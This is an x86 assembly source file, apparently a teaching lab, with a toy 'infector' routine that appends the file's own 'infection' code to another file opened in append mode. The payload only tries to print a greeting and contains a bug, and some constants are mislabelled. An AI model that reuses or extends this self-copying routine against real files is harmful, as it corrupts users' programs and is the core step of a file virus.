global _start
global system_call
global infection
global infector
global code_start
global code_end
global infected_print
extern main
section .rodata
STDOUT: dd 1
STDIN: dd 2
READ: dd 3
WRITE: dd 4
OPEN: dd 5
CLOSE: dd 6
infected_print: db "Hello, Infected File", 10, 0


section .text

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

code_start:
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state

    ;getting the useless garbage int arg
    mov eax, [ebp+8]

    mov eax, 4
    mov ebx, 1
    mov ecx, "hello"
    mov edx, 6
    int 0x80

    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad

    ;-----open-----
    mov eax, [OPEN]
    mov ebx, [ebp+8]        ;getting the
    mov ecx, (1024 | 1)       ;append
    mov edx, 0
    int 0x80
    mov ebx, eax
    push ebx        ;preserving ebx

    ;-----write-----
    mov eax, [WRITE]
    ;ebx has the file we entered it
    mov ecx, code_start
    mov edx, code_end - code_start
    int 0x80

    pop ebx        ;getting the file to ebx
    ;-----close-----
    mov eax, [CLOSE]
    ;ebx has the file
    int 0x80

    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_end:

